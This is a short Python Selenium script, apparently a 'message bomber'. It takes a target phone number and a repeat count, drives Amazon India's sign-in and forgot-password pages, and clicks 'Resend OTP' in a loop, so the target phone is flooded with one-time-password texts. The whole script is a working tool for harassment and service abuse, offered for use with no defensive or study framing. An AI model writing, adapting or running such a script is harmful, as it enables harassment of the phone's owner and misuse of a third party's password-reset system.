#download selenium using pip install
#Since I used Chrome. download Chromedriver of your Chrome version from online
from selenium import webdriver
import time

phone_number=input("Number you want to message bomb: ")
times=input("number of times to send message: ")
times=int(times)
times=times-2

browser=webdriver.Chrome('C:\chromedriver\chromedriver.exe') #to open chrome browser. ps: its loction where i kept the chromedriver.exe
browser.get('https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&') 

phone=browser.find_element_by_id('ap_email')
phone.send_keys(phone_number)                               #to fill the phone number in the text box

cont=browser.find_element_by_id('continue')
cont.click()

forgot=browser.find_element_by_id('auth-fpp-link-bottom')
forgot.click()

conti=browser.find_element_by_id('continue')
conti.click()

resend=browser.find_element_by_link_text('Resend OTP')
resend.click()


for i in range(times):
    resend=browser.find_element_by_link_text('Resend OTP')
    resend.click()
    

browser.quit()